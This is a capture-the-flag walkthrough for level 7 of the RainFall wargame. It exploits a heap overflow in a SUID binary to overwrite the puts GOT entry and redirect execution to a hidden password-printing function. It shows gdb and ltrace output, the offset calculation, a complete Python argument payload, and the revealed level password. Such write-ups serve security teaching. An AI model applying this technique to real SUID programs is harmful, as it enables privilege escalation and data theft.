# Level 7 Walkthrough

In this level, we exploit a heap-based buffer overflow to overwrite a function pointer, redirect execution to a hidden function, and print the next level’s password.

---

## Who am I?

Before diving into the exploitation, let's identify the current user context:

```
level7@RainFall:~$ id
uid=2024(level7) gid=2024(level7) groups=2024(level7),100(users)
```

## Where am I?

Let's inspect the current directory:

```
level7@RainFall:~$ ll
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7*
```

We have a SUID binary owned by level8. Our goal is to exploit this binary to read `/home/user/level8/.pass`.

---

## Binary Behavior

Let’s test how the binary reacts to different inputs. This gives us a hint about its internal logic:

```
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 hello
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 hello world
~~
```

Conclusion: the program crashes with fewer than two arguments. When given **two**, it prints `~~`, suggesting that execution completes successfully.

---

## Understanding the Program Structure

We now inspect the source to uncover how the binary is built. Below is the reconstructed code for `main()`:

```c
undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;

  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
```

> Simplified version for clarity:
>
> ```c
> void main(int argc, char **argv) {
>   int** a = malloc(8);
>   *a = (int*)1;
>   a[1] = malloc(8);
>   int** b = malloc(8);
>   *b = (int*)2;
>   b[1] = malloc(8);
>
>   strcpy((char*)a[1], argv[1]);
>   strcpy((char*)b[1], argv[2]);
>
>   FILE* f = fopen("/home/user/level8/.pass", "r");
>   fgets(c, 0x44, f);
>   puts("~~");
> }
> ```

We also find an unused function `m()` in the binary:

```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  time_t tVar1;
  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1);
  return;
}
```

This prints the contents of the buffer `c` (where the password is stored) and the current timestamp. This confirms that the password is read but not shown, unless we force execution into this `m()` function.

### Summary of What We've Learned So Far

* Two heap buffers `a[1]` and `b[1]` receive unsanitized user input via `strcpy()`.
* These buffers are allocated consecutively, so overflowing `a[1]` lets us control `b[1]`.
* If we overwrite `b[1]` to point to the GOT entry of a function (e.g., `puts`), we can then overwrite that function pointer.
* The hidden `m()` function reveals the password, this becomes our target.

This code is insecure because it allows out-of-bounds writes across separately allocated chunks on the heap, with no bounds checking. By overwriting a pointer used in a later `strcpy()`, we gain write-what-where capabilities, perfect for GOT overwrite attacks.

Next, we’ll use this knowledge to craft our strategy and calculate the exact overwrite offset.

---

## Strategy: Overwrite a Function Pointer

Now that we understand the structure, here’s the attack plan:

* Overflow the first buffer (pointed to by `a[1]`) with a precisely calculated number of bytes to reach and overwrite `b[1]`. We'll use Metasploit's tools to determine this exact offset in the next section.
* Place the address of `puts()`’s GOT entry into `b[1]`
* Use `argv[2]` to supply the replacement function address, i.e., the address of `m()`

This setup causes the second `strcpy()` to write the address of `m()` into the GOT entry for `puts()`. So when `puts("~~")` is called, it actually calls `m()`, which reveals the password.

---

## Step 1: Find the Overflow Offset&#x20;

We'll take a simple and intuitive approach using `ltrace` combined with Metasploit’s pattern tools. This makes it easy to visualize where our input lands in memory and calculate the overflow offset.

First, generate a unique pattern:

```
~/RainFall/level7 main > msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Then, run the binary using `ltrace`:

```
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
__libc_start_main(0x8048521, 2, 0xbffff794, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                   = 0x0804a008
malloc(8)                                                   = 0x0804a018
malloc(8)                                                   = 0x0804a028
malloc(8)                                                   = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)   = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
```

Here’s what happens:

* `malloc()` allocates four chunks. Two are used to store the actual user-controlled strings.
* We supply a long string for `argv[1]` using a unique pattern.
* When the first `strcpy()` writes into the `a[1]` buffer, it overflows and overwrites the `b[1]` pointer.
* The next `strcpy()` then crashes trying to write to the corrupted `b[1]` address: `0x37614136`

This address is part of our pattern. Let’s now use Metasploit to determine the corresponding offset:

```
~/RainFall/level7 main > msf-pattern_offset -q 0x37614136
[*] Exact match at offset 20
```

Confirmed: the overflow offset is **20 bytes**. We now know exactly how many bytes to write to control the pointer `b[1]`. Let’s continue.

---

## Step 2: Identify the Target GOT Entry

We now want to overwrite a function pointer used in the binary, specifically the one used in `puts("~~");` So that instead of calling `puts`, the binary jumps to our hidden `m()` function.

### Why `puts()`?

Looking back at the main function:

```c
puts("~~");
```

This is the final function called before `main()` returns. If we can overwrite the GOT entry for puts\` with the address of `m()`, we will hijack execution at the very end of the program, just before the program terminates cleanly.

In the next step, we’ll locate that GOT entry in GDB and prepare to craft our payload.

## Step 3: Locate the GOT Entry for `puts`

To redirect execution to the `m()` function, we’ll overwrite the **GOT entry of** `puts()`. When the program eventually calls `puts("~~")`, it will instead jump to `m()` and print the password.

### Using GDB to Locate the GOT Entry

First, disassemble `puts@plt` in GDB:

```
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

&#x20; &#x20;

The first instruction shows us a jump to an address stored at `0x08049928`.

This is the **Global Offset Table (GOT) entry for** `puts()`. It’s a pointer that, once resolved, holds the actual location of the real `puts()` function in libc. By overwriting it, we can redirect execution to anywhere, including our hidden function `m()`.

GOT entry target: `0x08049928`

We now have the following setup:

* `b[1]` (overwritable pointer) will be set to `0x08049928`
* `argv[2]` (copied into `*b[1]`) will contain the address of `m()`

This lets us write a new function address into the GOT entry of `puts()`, gaining control of the execution flow.

Next, we’ll find the exact address of `m()` so we can complete the exploit payload.

## Step 4: Find the Address of `m()`

To redirect execution properly, we need the actual address of the `m()` function. Use GDB to list the functions and inspect `m`:

```
(gdb) info functions
...
0x080484f4 m
...
```

So the address of `m()` is:

```
0x080484f4
```

Now we have everything we need:

* `Offset to overwrite b[1]`: 20 bytes
* `Address to write into b[1]`: `0x08049928` (GOT entry of `puts`)
* `Data to write at this address`: `0x080484f4` (address of `m()`)

## Step 5: Craft and Run the Final Exploit

We’ll construct two arguments:

* `argv[1]`: 20-byte padding + address of the GOT entry for `puts` (`0x08049928`)
* `argv[2]`: address of `m()` (`0x080484f4`)

### Build the payload

Here’s how you do it in Bash using `python -c` for each argument:

```
export A=$(python -c 'print("A" * 20 + "\x28\x99\x04\x08")')
export B=$(python -c 'print("\xf4\x84\x04\x08")')
```

Then run the exploit:

```
./level7 "$A" "$B"
```

### Result:

You should now see the password:

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1754404610
```

The `m()` function was called instead of `puts()`, printing the password followed by a timestamp.

---

## Conclusion

This level showcases a creative and effective heap-based exploit technique:

Instead of targeting the stack or injecting shellcode, we use a heap overflow to corrupt a **function pointer** stored in a second heap chunk. By precisely calculating the overflow offset, we overwrite the pointer `b[1]` with the address of a GOT entry (`puts`). We then write the address of a hidden function (`m`) to this GOT slot.

When the program calls `puts("~~")` at the end of execution, it unknowingly jumps into `m()`, which prints the content of the previously read password file.

